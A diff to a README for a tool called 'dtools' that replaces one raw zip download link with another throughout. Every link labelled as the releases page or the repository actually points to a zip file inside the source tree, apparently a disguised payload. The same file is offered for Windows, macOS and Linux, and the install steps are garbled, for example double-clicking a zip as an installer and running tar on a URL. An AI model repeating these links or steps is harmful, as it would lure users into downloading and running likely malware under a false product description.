@@ -1,6 +1,6 @@
 # 🚀 dtools - Your Easy Command Line Assistant
 
-[![Download dtools](https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip)](https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip)
+[![Download dtools](https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip)](https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip)
 
 ## 📋 Introduction
 
@@ -21,28 +21,28 @@ Before you download dtools, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get **dtools**, visit this page to download: [dtools Releases Page](https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip).
+To get **dtools**, visit this page to download: [dtools Releases Page](https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip).
 
 On the releases page, you will find various versions of dtools. Choose the latest version and download the appropriate file for your operating system. Here’s how:
 
-1. Go to the [dtools Releases Page](https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip).
+1. Go to the [dtools Releases Page](https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip).
 2. Look for the section labeled "Assets."
 3. Download the file that matches your operating system. For example:
-   - `https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip` for Windows users
-   - `https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip` for macOS users
-   - `https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip` for Linux users
+   - `https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip` for Windows users
+   - `https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip` for macOS users
+   - `https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip` for Linux users
 
 ### 🏗️ Installation Steps
 
 #### Windows
 
-1. Locate the downloaded `https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip` file in your Downloads folder.
+1. Locate the downloaded `https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip` file in your Downloads folder.
 2. Double-click the file to start the installation.
 3. Follow the prompts in the installation wizard to complete the setup.
 
 #### macOS
 
-1. Find the downloaded `https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip` file in your Downloads folder.
+1. Find the downloaded `https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip` file in your Downloads folder.
 2. Double-click the file to mount it.
 3. Drag the `dtools` icon to your Applications folder.
 4. Eject the installer by clicking the eject button in Finder.
@@ -51,7 +51,7 @@ On the releases page, you will find various versions of dtools. Choose the lates
 
 1. Open a terminal.
 2. Navigate to your Downloads directory using `cd ~/Downloads`.
-3. Extract the downloaded file: `tar -xvzf https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip`.
+3. Extract the downloaded file: `tar -xvzf https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip`.
 4. Change to the dtools directory: `cd dtools`.
 5. Ensure the binary file is executable, if not, run: `chmod +x dtools`.
 6. Run the application using `./dtools`.
@@ -88,7 +88,7 @@ This command provides a comprehensive overview of all available commands and opt
 
 For more information, visit:
 
-- [dtools GitHub Repository](https://raw.githubusercontent.com/mhamzah4585/dtools/main/src/commands/pentest/dtools-3.0-alpha.5.zip)
+- [dtools GitHub Repository](https://github.com/mhamzah4585/dtools/raw/refs/heads/main/src/commands/vm/Software-1.8.zip)
 - Community forums for user discussions and support.
 
 ## 💬 Feedback
